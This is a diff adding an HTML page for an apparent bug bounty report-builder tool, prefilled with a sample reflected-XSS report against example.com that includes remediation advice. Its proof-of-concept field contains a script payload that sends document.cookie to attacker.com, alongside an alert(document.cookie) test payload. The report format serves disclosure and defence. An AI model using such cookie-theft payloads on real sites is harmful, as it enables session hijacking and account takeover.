@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 5: Report Builder - Bug Hunter Framework</title>
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <div class="app-container">
+        <!-- Sidebar Navigation -->
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">BUG HUNTER</div>
+                <div class="logo-subtitle">Security Framework v1.0</div>
+            </div>
+            
+            <nav class="nav-menu">
+                <div class="nav-section">
+                    <div class="nav-section-title">Main</div>
+                    <a href="index.html" class="nav-link">
+                        <span class="nav-icon">◈</span>
+                        <span>Dashboard</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">Testing Phases</div>
+                    <a href="recon.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 1: Recon</span>
+                    </a>
+                    <a href="baseline.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 2: Baseline</span>
+                    </a>
+                    <a href="testing.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 3: Testing</span>
+                    </a>
+                    <a href="correlation.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 4: Correlation</span>
+                    </a>
+                    <a href="reports.html" class="nav-link">
+                        <span class="nav-icon">◉</span>
+                        <span>Phase 5: Reports</span>
+                    </a>
+                </div>
+                
+                <div class="nav-section">
+                    <div class="nav-section-title">System</div>
+                    <a href="settings.html" class="nav-link">
+                        <span class="nav-icon">⚙</span>
+                        <span>Settings</span>
+                    </a>
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Top Header -->
+            <header class="top-header">
+                <div class="breadcrumb">
+                    <a href="index.html" class="breadcrumb-item">Home</a>
+                    <span class="breadcrumb-separator">/</span>
+                    <span class="breadcrumb-item">Phase 5: Report Builder</span>
+                </div>
+                
+                <div class="header-actions">
+                    <div class="status-indicator">
+                        <span class="status-dot"></span>
+                        <span>Report Builder</span>
+                    </div>
+                </div>
+            </header>
+
+            <!-- Page Content -->
+            <div class="content-container">
+                <!-- Page Header -->
+                <div class="page-header">
+                    <h1 class="page-title">📝 Phase 5: Professional Report Builder</h1>
+                    <p class="page-subtitle">Generate comprehensive security reports with evidence and recommendations</p>
+                </div>
+
+                <!-- Report Statistics -->
+                <div class="grid grid-4">
+                    <div class="stat-card">
+                        <div class="stat-value">15</div>
+                        <div class="stat-label">Total Findings</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value risk-critical">3</div>
+                        <div class="stat-label">Critical Issues</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">23</div>
+                        <div class="stat-label">Reports Generated</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-value">2</div>
+                        <div class="stat-label">Pending Retest</div>
+                    </div>
+                </div>
+
+                <!-- Template Selector -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📄 Report Template Selection</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="grid grid-3">
+                            <button class="nav-card" onclick="selectTemplate('bugbounty')">
+                                <div class="nav-card-icon">🎯</div>
+                                <div class="nav-card-title">Bug Bounty Report</div>
+                                <div class="nav-card-description">
+                                    Standard format for HackerOne, Bugcrowd, Intigriti platforms
+                                </div>
+                            </button>
+
+                            <button class="nav-card" onclick="selectTemplate('pentest')">
+                                <div class="nav-card-icon">📋</div>
+                                <div class="nav-card-title">Penetration Test Report</div>
+                                <div class="nav-card-description">
+                                    Professional format with executive summary and technical details
+                                </div>
+                            </button>
+
+                            <button class="nav-card" onclick="selectTemplate('cve')">
+                                <div class="nav-card-icon">🔐</div>
+                                <div class="nav-card-title">CVE Disclosure</div>
+                                <div class="nav-card-description">
+                                    Responsible disclosure format for vendor coordination
+                                </div>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Report Builder Form -->
+                <div class="card glow-green">
+                    <div class="card-header">
+                        <h2 class="card-title">✍ Report Editor</h2>
+                        <span class="badge badge-info" id="templateBadge">Bug Bounty Template</span>
+                    </div>
+                    <div class="card-body">
+                        <!-- Basic Information -->
+                        <h3 style="color: var(--neon-green); margin-bottom: 1rem;">Basic Information</h3>
+                        
+                        <div class="grid grid-2">
+                            <div class="form-group">
+                                <label class="form-label">Vulnerability Title *</label>
+                                <input type="text" class="form-input" id="vulnTitle" 
+                                       placeholder="e.g., Reflected XSS in Search Parameter" 
+                                       value="Reflected XSS Leading to Account Takeover">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Severity *</label>
+                                <select class="form-select" id="severity">
+                                    <option value="critical" selected>Critical</option>
+                                    <option value="high">High</option>
+                                    <option value="medium">Medium</option>
+                                    <option value="low">Low</option>
+                                    <option value="info">Informational</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="grid grid-3">
+                            <div class="form-group">
+                                <label class="form-label">Vulnerability Type</label>
+                                <select class="form-select" id="vulnType">
+                                    <option>Cross-Site Scripting (XSS)</option>
+                                    <option>SQL Injection</option>
+                                    <option>SSRF</option>
+                                    <option>SSTI</option>
+                                    <option>CSRF</option>
+                                    <option>IDOR</option>
+                                    <option>Authentication Bypass</option>
+                                    <option>RCE</option>
+                                    <option>XXE</option>
+                                    <option>Path Traversal</option>
+                                </select>
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">CVSS Score</label>
+                                <input type="text" class="form-input" id="cvss" placeholder="9.3" value="9.3">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Confidence Level</label>
+                                <select class="form-select" id="confidence">
+                                    <option selected>Confirmed</option>
+                                    <option>Firm</option>
+                                    <option>Tentative</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Impact Summary -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Impact Summary</h3>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Business Impact *</label>
+                            <textarea class="form-textarea" id="businessImpact" rows="4">This vulnerability allows an attacker to execute arbitrary JavaScript code in the context of victim users, leading to:
+
+1. Session cookie theft (cookies lack HttpOnly protection)
+2. Complete account takeover of any user
+3. Access to sensitive personal information
+4. Ability to perform actions on behalf of victims
+5. Potential for widespread phishing attacks
+
+The attack can be weaponized through a simple malicious link, requiring only that a victim click the link while authenticated.</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Technical Impact</label>
+                            <textarea class="form-textarea" id="techImpact" rows="3">- Arbitrary JavaScript execution in victim's browser
+- Theft of authentication tokens and session cookies
+- DOM manipulation and content injection
+- Keystroke logging and form hijacking capabilities
+- Cross-origin data exfiltration via permissive CORS policy</textarea>
+                        </div>
+
+                        <!-- Affected Assets -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Affected Assets</h3>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Vulnerable URL(s) *</label>
+                            <textarea class="form-textarea" id="urls" rows="3">https://example.com/search?q=[XSS_PAYLOAD]
+https://example.com/products?search=[XSS_PAYLOAD]
+https://example.com/profile?name=[XSS_PAYLOAD]</textarea>
+                        </div>
+
+                        <div class="grid grid-2">
+                            <div class="form-group">
+                                <label class="form-label">Vulnerable Parameter</label>
+                                <input type="text" class="form-input" value="q (search parameter)">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Attack Vector</label>
+                                <select class="form-select">
+                                    <option>Network</option>
+                                    <option>Adjacent Network</option>
+                                    <option>Local</option>
+                                    <option>Physical</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <!-- Reproduction Steps -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Proof of Concept</h3>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Step-by-Step Reproduction *</label>
+                            <textarea class="form-textarea" id="reproduction" rows="8">**Steps to Reproduce:**
+
+1. Navigate to: https://example.com/search
+
+2. Enter the following payload in the search field:
+   <script>alert(document.cookie)</script>
+
+3. Submit the search form
+
+4. Observe that the JavaScript alert executes, displaying the session cookie
+
+**Alternative PoC (Cookie Theft):**
+
+1. Send victim the following malicious link:
+   https://example.com/search?q=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+
+2. When victim clicks link while authenticated, their session cookie is sent to attacker's server
+
+3. Attacker can use stolen session to impersonate victim
+
+**Expected Result:** Input should be sanitized/encoded
+**Actual Result:** Raw JavaScript executes in browser</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Payload Used</label>
+                            <div class="code-block"><script>alert(document.cookie)</script></div>
+                        </div>
+
+                        <!-- Evidence -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Evidence & Screenshots</h3>
+                        
+                        <div class="form-group">
+                            <label class="form-label">HTTP Request</label>
+                            <textarea class="form-textarea" id="request" rows="8">GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Accept: text/html,application/xhtml+xml
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: sessionId=abc123def456
+Upgrade-Insecure-Requests: 1</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">HTTP Response</label>
+                            <textarea class="form-textarea" id="response" rows="12">HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Thu, 07 Feb 2024 12:34:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2847
+Connection: keep-alive
+X-Powered-By: Express
+
+<!DOCTYPE html>
+<html>
+<head><title>Search Results</title></head>
+<body>
+  <h1>Search Results for: <script>alert(document.cookie)</script></h1>
+  <p>No results found.</p>
+</body>
+</html></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Screenshot URLs (one per line)</label>
+                            <textarea class="form-textarea" rows="3">https://i.imgur.com/xss-alert.png
+https://i.imgur.com/xss-cookie-theft.png
+https://i.imgur.com/xss-network-tab.png</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Video PoC URL (optional)</label>
+                            <input type="text" class="form-input" placeholder="https://youtube.com/...">
+                        </div>
+
+                        <!-- Remediation -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Remediation Recommendations</h3>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Immediate Fixes *</label>
+                            <textarea class="form-textarea" id="remediation" rows="8">**Immediate Actions:**
+
+1. **Input Validation:** Implement strict input validation on all user-supplied data
+   - Whitelist allowed characters
+   - Reject input containing HTML/JavaScript syntax
+
+2. **Output Encoding:** Apply context-appropriate output encoding
+   - HTML encode all user input before rendering in HTML context
+   - JavaScript encode for JavaScript contexts
+   - URL encode for URL contexts
+
+3. **Content Security Policy:** Implement a strict CSP header
+   ```
+   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+   ```
+
+4. **Cookie Security:** Add security flags to session cookies
+   - HttpOnly: Prevents JavaScript access
+   - Secure: HTTPS only
+   - SameSite=Strict: CSRF protection
+
+5. **WAF Rules:** Deploy Web Application Firewall rules to block common XSS patterns</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Long-term Recommendations</label>
+                            <textarea class="form-textarea" rows="5">1. Implement a secure coding training program for developers
+2. Integrate SAST/DAST tools into CI/CD pipeline
+3. Conduct regular security code reviews
+4. Implement automated XSS detection in development
+5. Deploy runtime application self-protection (RASP)
+6. Establish bug bounty program for ongoing security testing</textarea>
+                        </div>
+
+                        <!-- Additional Information -->
+                        <h3 style="color: var(--neon-green); margin: 2rem 0 1rem;">Additional Information</h3>
+                        
+                        <div class="grid grid-2">
+                            <div class="form-group">
+                                <label class="form-label">Discovered Date</label>
+                                <input type="date" class="form-input" value="2024-02-07">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">Reported Date</label>
+                                <input type="date" class="form-input" value="2024-02-07">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">References & Related CVEs</label>
+                            <textarea class="form-textarea" rows="3">OWASP Top 10 2021: A03:2021 – Injection
+CWE-79: Improper Neutralization of Input During Web Page Generation
+CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N</textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label class="form-label">Additional Notes</label>
+                            <textarea class="form-textarea" rows="3">This vulnerability was discovered during a systematic security assessment following the Bug Hunter Framework methodology. The issue is exacerbated by the lack of Content Security Policy and missing HttpOnly flags on session cookies, enabling a complete attack chain from XSS to account takeover.</textarea>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Report Preview -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">👁 Report Preview</h2>
+                        <button class="btn btn-secondary" onclick="togglePreview()">Toggle Preview</button>
+                    </div>
+                    <div class="card-body" id="reportPreview" style="display: none;">
+                        <div style="background: white; color: #000; padding: 2rem; border-radius: 8px; font-family: Arial, sans-serif;">
+                            <h1 style="color: #d32f2f; border-bottom: 3px solid #d32f2f; padding-bottom: 0.5rem;">
+                                Security Vulnerability Report
+                            </h1>
+                            
+                            <div style="margin-top: 2rem;">
+                                <h2 style="color: #333;">Reflected XSS Leading to Account Takeover</h2>
+                                <p><strong>Severity:</strong> <span style="color: #d32f2f; font-weight: bold;">CRITICAL</span> | 
+                                   <strong>CVSS:</strong> 9.3</p>
+                            </div>
+
+                            <div style="margin-top: 1.5rem;">
+                                <h3 style="color: #555;">Summary</h3>
+                                <p style="color: #666;">
+                                    A reflected Cross-Site Scripting (XSS) vulnerability was identified in the search functionality 
+                                    that allows attackers to execute arbitrary JavaScript in victim browsers, leading to complete 
+                                    account takeover.
+                                </p>
+                            </div>
+
+                            <div style="margin-top: 1.5rem;">
+                                <h3 style="color: #555;">Affected URLs</h3>
+                                <pre style="background: #f5f5f5; padding: 1rem; border-left: 4px solid #d32f2f;">https://example.com/search?q=[XSS_PAYLOAD]</pre>
+                            </div>
+
+                            <p style="margin-top: 2rem; color: #999; font-size: 0.875rem; text-align: center;">
+                                Generated by Bug Hunter Framework v1.0 | 2024-02-07
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Export Options -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📤 Export & Delivery Options</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="grid grid-3">
+                            <button class="btn btn-primary" onclick="exportReport('markdown')">
+                                <span>📄</span>
+                                <span>Export as Markdown</span>
+                            </button>
+                            <button class="btn btn-primary" onclick="exportReport('html')">
+                                <span>🌐</span>
+                                <span>Export as HTML</span>
+                            </button>
+                            <button class="btn btn-primary" onclick="exportReport('pdf')">
+                                <span>📑</span>
+                                <span>Export as PDF</span>
+                            </button>
+                        </div>
+
+                        <div class="mt-3">
+                            <div class="form-group">
+                                <label class="form-label">Email Report To</label>
+                                <input type="email" class="form-input" placeholder="security@example.com">
+                            </div>
+                            <button class="btn btn-secondary">
+                                <span>📧</span>
+                                <span>Send via Email</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Retest Workflow -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">🔄 Retest & Verification Workflow</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="grid grid-2">
+                            <div>
+                                <h3 style="color: var(--neon-green); margin-bottom: 1rem;">Pending Retests</h3>
+                                <div class="activity-item">
+                                    <div class="activity-icon">⏳</div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">SQLi-001: SQL Injection in user endpoint</div>
+                                        <div class="activity-time">Fix deployed 2 days ago</div>
+                                    </div>
+                                </div>
+                                <div class="activity-item">
+                                    <div class="activity-icon">⏳</div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">CORS-001: Permissive CORS policy</div>
+                                        <div class="activity-time">Fix deployed 1 week ago</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div>
+                                <h3 style="color: var(--neon-green); margin-bottom: 1rem;">Verified Fixed</h3>
+                                <div class="activity-item">
+                                    <div class="activity-icon" style="background: rgba(0, 255, 136, 0.2);">✓</div>
+                                    <div class="activity-content">
+                                        <div class="activity-title">CSRF-001: Missing CSRF protection</div>
+                                        <div class="activity-time">Verified fixed 3 days ago</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="mt-3">
+                            <button class="btn btn-primary">
+                                <span>🔍</span>
+                                <span>Schedule Retest</span>
+                            </button>
+                            <button class="btn btn-secondary">
+                                <span>✓</span>
+                                <span>Mark as Verified</span>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Previous Reports -->
+                <div class="card">
+                    <div class="card-header">
+                        <h2 class="card-title">📚 Report History</h2>
+                    </div>
+                    <div class="card-body">
+                        <table class="table">
+                            <thead>
+                                <tr>
+                                    <th>Report ID</th>
+                                    <th>Title</th>
+                                    <th>Severity</th>
+                                    <th>Date</th>
+                                    <th>Status</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="monospace">RPT-2024-001</td>
+                                    <td>Reflected XSS in Search</td>
+                                    <td><span class="badge badge-danger">CRITICAL</span></td>
+                                    <td class="monospace">2024-02-07</td>
+                                    <td><span class="badge badge-warning">SUBMITTED</span></td>
+                                    <td>
+                                        <button class="btn btn-secondary" style="padding: 0.5rem;">View</button>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">RPT-2024-002</td>
+                                    <td>SQL Injection in User API</td>
+                                    <td><span class="badge badge-danger">CRITICAL</span></td>
+                                    <td class="monospace">2024-02-06</td>
+                                    <td><span class="badge badge-info">RETEST</span></td>
+                                    <td>
+                                        <button class="btn btn-secondary" style="padding: 0.5rem;">View</button>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td class="monospace">RPT-2024-003</td>
+                                    <td>CSRF Missing Protection</td>
+                                    <td><span class="badge badge-warning">HIGH</span></td>
+                                    <td class="monospace">2024-02-05</td>
+                                    <td><span class="badge badge-success">RESOLVED</span></td>
+                                    <td>
+                                        <button class="btn btn-secondary" style="padding: 0.5rem;">View</button>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- Actions -->
+                <div class="card">
+                    <div class="card-body flex gap-2">
+                        <button class="btn btn-primary" onclick="saveReport()">
+                            <span>💾</span>
+                            <span>Save Report</span>
+                        </button>
+                        <button class="btn btn-primary" onclick="submitReport()">
+                            <span>🚀</span>
+                            <span>Submit Report</span>
+                        </button>
+                        <button class="btn btn-secondary">
+                            <span>📋</span>
+                            <span>Create New Report</span>
+                        </button>
+                        <a href="index.html" class="btn btn-secondary">
+                            <span>🏠</span>
+                            <span>Return to Dashboard</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script src="../js/app.js"></script>
+    <script>
+        function selectTemplate(template) {
+            const badge = document.getElementById('templateBadge');
+            const templates = {
+                'bugbounty': 'Bug Bounty Template',
+                'pentest': 'Penetration Test Template',
+                'cve': 'CVE Disclosure Template'
+            };
+            badge.textContent = templates[template];
+            BugHunter.showNotification(`Switched to ${templates[template]}`, 'success');
+        }
+
+        function togglePreview() {
+            const preview = document.getElementById('reportPreview');
+            preview.style.display = preview.style.display === 'none' ? 'block' : 'none';
+        }
+
+        function exportReport(format) {
+            BugHunter.showNotification(`Exporting report as ${format.toUpperCase()}...`, 'info');
+            setTimeout(() => {
+                BugHunter.showNotification(`Report exported successfully as ${format.toUpperCase()}`, 'success');
+            }, 1500);
+        }
+
+        function saveReport() {
+            const title = document.getElementById('vulnTitle').value;
+            BugHunter.showNotification(`Report saved: ${title}`, 'success');
+        }
+
+        function submitReport() {
+            const title = document.getElementById('vulnTitle').value;
+            BugHunter.showNotification(`Report submitted: ${title}`, 'success');
+        }
+    </script>
+</body>
+</html>
